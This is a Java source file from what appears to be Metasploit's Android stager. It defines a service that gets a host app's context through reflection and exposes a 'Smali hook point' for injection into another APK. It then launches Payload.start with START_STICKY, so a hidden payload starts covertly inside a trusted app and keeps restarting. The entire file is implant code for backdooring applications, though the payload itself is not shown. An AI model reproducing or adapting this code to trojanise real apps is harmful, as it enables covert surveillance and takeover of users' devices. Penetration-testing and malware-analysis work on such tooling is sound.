package com.metasploit.stage;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;

import java.lang.reflect.Method;

public class MainService extends Service {

    private static final Object contextWaiter = new Object();
    private static Context context;

    private static void findContext() throws Exception {
        Class<?> activityThreadClass;
        try {
            activityThreadClass = Class.forName("android.app.ActivityThread");
        } catch (ClassNotFoundException e) {
            // No context
            return;
        }
        final Method currentApplication = activityThreadClass.getMethod("currentApplication");
        context = (Context) currentApplication.invoke(null, (Object[]) null);
        if (context == null) {
            // Post to the UI/Main thread and try and retrieve the Context
            final Handler handler = new Handler(Looper.getMainLooper());
            handler.post(new Runnable() {
                public void run() {
                    synchronized (contextWaiter) {
                        try {
                            context = (Context) currentApplication.invoke(null, (Object[]) null);
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                        contextWaiter.notify();
                    }
                }
            });
            synchronized (contextWaiter) {
                if (context == null) {
                    contextWaiter.wait(100);
                }
            }
        }
    }

    // Smali hook point
    public static void start() {
        try {
            findContext();
        } catch (Exception e) {

        }
        if (context != null) {
            startService(context);
        }
    }

    public static void startService(Context context) {
        context.startService(new Intent(context, MainService.class));
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Payload.start(this);
        return START_STICKY;
    }

}
